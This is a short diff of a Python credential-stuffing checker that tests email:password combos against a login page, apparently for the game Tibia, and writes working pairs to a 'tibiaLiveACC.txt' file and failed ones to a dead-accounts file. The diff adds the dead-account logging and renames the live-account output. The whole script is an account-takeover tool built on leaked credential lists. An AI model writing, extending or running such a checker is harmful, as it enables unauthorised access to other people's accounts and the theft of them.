@@ -17,10 +17,11 @@ for lines in file:
 
         if('You have entered a wrong password or email address.' in source.text):
             print('Email ou senha errados: {}:{}'.format(combo[0], combo[1]))
+            print('--> Dead accounts <--\n' + combo[0] + '|' + combo[1], file=open('tibiaDeadACC.txt', 'a+'))
 
         else:
             print('Conta Funcionando: {}:{}'.format(combo[0], combo[1]))
-            print('--> Live accounts <--\n' + combo[0] + '|' + combo[1], file=open('tibiaACC.txt', 'a+'))
+            print('--> Live accounts <--\n' + combo[0] + '|' + combo[1], file=open('tibiaLiveACC.txt', 'a+'))
 
     except:
         break
